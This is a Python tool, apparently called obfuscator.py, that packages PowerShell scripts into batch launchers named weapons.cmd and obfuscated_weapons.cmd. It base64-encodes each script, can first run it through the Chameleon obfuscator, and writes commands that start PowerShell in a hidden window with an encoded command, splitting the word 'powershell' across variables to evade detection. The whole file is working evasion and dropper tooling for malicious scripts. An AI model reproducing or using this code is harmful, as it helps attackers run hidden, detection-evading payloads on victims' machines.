import sys
import base64
import os
import subprocess


def base64_encode(file_path):
    with open(file_path, 'r', encoding='utf-8') as file:
        file_content = file.read()

    file_content = file_content.replace('\n', '\r\n')
    utf16le_bytes = file_content.encode('utf-16le')

    encoded_content = base64.b64encode(utf16le_bytes).decode('utf-8')
    return encoded_content


def generate_cmd(scripts, output_file, obfuscate_job=False):
    with open(output_file, 'w', encoding='utf-8') as outfile:
        outfile.write(f'@echo off\nset xwp0=powershell\nset xwp1=-windowStyle\nset xwp2=hidden\n')
        current_dir = os.getcwd()

        for script_path in scripts:
            file_name, _ = os.path.splitext(os.path.basename(script_path))
            if obfuscate_job:
                obfuscated_file_name = f'{file_name}_ob.ps1'
                chameleon_dir = os.path.join(current_dir, "..", "chameleon")
                chameleon_path = os.path.join(chameleon_dir, "chameleon.py")
                args = f"-a -o ../utilitarian/{obfuscated_file_name} {script_path}"
                venv_path = os.path.join(current_dir, "..", ".venv", "Scripts", "python.exe")

                try:
                    # Runs on the OS
                    os.system(f"{venv_path} {chameleon_path} {args}")
                finally:
                    # Runs on the workflow
                    os.system(f"{chameleon_path} {args}")

                script_path = obfuscated_file_name

            encoded_script = base64_encode(script_path)

            outfile.write(f'set {file_name}="{encoded_script}"\n')
            outfile.write(
                f'cmd /c start /min "" %xwp0% %xwp1% %xwp2% -c (%xwp0% %xwp1% %xwp2% -enC ($env:{file_name}))\n')
            # if obfuscate_job:
            #    os.remove('temporary_jobby.ps1')


def main():
    if len(sys.argv) != 3:
        print("Usage: python obfuscator.py <script1> <script2>")
        sys.exit(1)

    generate_cmd(sys.argv[1:], 'weapons.cmd', obfuscate_job=False)
    generate_cmd(sys.argv[1:], 'obfuscated_weapons.cmd', obfuscate_job=True)


if __name__ == "__main__":
    main()
